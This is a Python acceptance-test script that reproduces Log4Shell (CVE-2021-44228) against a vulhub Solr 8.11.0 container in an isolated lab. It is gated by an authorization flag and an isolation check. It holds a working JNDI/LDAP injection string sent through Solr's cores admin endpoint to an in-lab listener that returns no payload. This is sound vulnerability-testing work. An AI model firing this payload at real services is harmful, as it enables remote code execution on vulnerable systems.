#!/usr/bin/env python3
"""Phase 3 acceptance: real Log4Shell / CVE-2021-44228 on vulhub Solr 8.11.0.

Gated: deploys nothing unless CR_PHASE3_AUTHORIZED=1 and the isolation guard passes.

Safe observable: the REAL Log4j 2.14.1 inside Solr performs a JNDI/LDAP lookup to
the in-lab, detection-only listener when attacker-controlled input reaches a logged
parameter. The listener records the inbound connection and returns NOTHING, so the
callback fires (proving the vulnerability) without any class loading or RCE.
"""
from __future__ import annotations

import json
import os
import sys
import time
import urllib.parse
from datetime import datetime, timezone

import poc_common as pc

CHAIN = "log4shell-solr"
PROJECT = "cr-poc-log4solr"
COMPOSE = "compose.log4shell.yml"
EVIDENCE = pc.EVIDENCE
CALLBACKS = EVIDENCE / "callbacks.jsonl"

# Real Log4Shell trigger against Solr's cores admin action, pointing at the in-lab
# listener. Marker in the path lets us tie a callback to the crafted request.
JNDI = "${jndi:ldap://listener:1389/sol}"


def _callbacks() -> list[dict]:
    if not CALLBACKS.exists():
        return []
    out = []
    for line in CALLBACKS.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if line:
            try:
                out.append(json.loads(line))
            except json.JSONDecodeError:
                pass
    return out


def _solr_request(action_value: str) -> str:
    q = urllib.parse.quote(action_value, safe="")
    script = (
        "import urllib.request\n"
        "try:\n"
        " urllib.request.urlopen('http://solr:8983/solr/admin/cores?action=%s', timeout=8).read()\n"
        " print('sent')\n"
        "except Exception as e:\n"
        " print('sent-with-status=' + type(e).__name__)" % q
    )
    r = pc.run(pc.compose(PROJECT, COMPOSE) + ["exec", "-T", "attacker", "python", "-c", script], timeout=30)
    return (r.stdout or r.stderr).strip()


def main() -> int:
    blocked = pc.preflight(CHAIN)
    if blocked:
        return pc.finish(blocked)

    EVIDENCE.mkdir(exist_ok=True)
    os.chmod(EVIDENCE, 0o777)
    CALLBACKS.write_text("", encoding="utf-8")
    os.chmod(CALLBACKS, 0o666)

    result = {"chain": CHAIN, "run_at": datetime.now(timezone.utc).isoformat(), "steps": []}
    try:
        up = pc.run(pc.compose(PROJECT, COMPOSE) + ["up", "-d"], timeout=600)
        if up.returncode != 0:
            result.update({"status": "NOT_TESTED", "reason": "compose up failed: " + up.stderr[-400:]})
            return pc.finish(result)
        if not pc.wait_tcp(PROJECT, COMPOSE, "attacker", "solr", 8983, 150):
            result.update({"status": "NOT_TESTED", "reason": "solr did not become reachable"})
            return pc.finish(result)
        time.sleep(3)

        before = len(_callbacks())
        benign = _solr_request("STATUS")
        time.sleep(2)
        benign_cb = _callbacks()
        result["steps"].append({"step": "benign", "observed": benign,
                                "callbacks": len(benign_cb), "expected": "no callback",
                                "ok": len(benign_cb) == before})

        crafted = _solr_request(JNDI)
        time.sleep(3)
        after = _callbacks()
        new = after[len(benign_cb):]
        ok = len(new) >= 1
        result["steps"].append({"step": "log4shell_jndi", "injection": JNDI, "observed": crafted,
                                "new_callbacks": new, "expected": "one LDAP callback from solr",
                                "ok": ok})

        result["status"] = "PASS" if (ok and result["steps"][0]["ok"]) else "FAIL"
        result["fidelity"] = {
            "reproduced": ["B2 real Log4Shell JNDI/LDAP callback"] if result["status"] == "PASS" else [],
            "real_target": "vulhub/solr:8.11.0 with real Log4j 2.14.1 (CVE-2021-44228)",
            "observable": "in-lab listener recorded an LDAP connection from the Solr container; "
                          "listener returned no payload, so no class was loaded/executed.",
            "safety": "isolation guard confirmed host+internet unreachable before deploy; internal network only.",
        }
        return pc.finish(result)
    finally:
        pc.run(pc.compose(PROJECT, COMPOSE) + ["down", "-v", "--remove-orphans"], timeout=90)


if __name__ == "__main__":
    sys.exit(main())
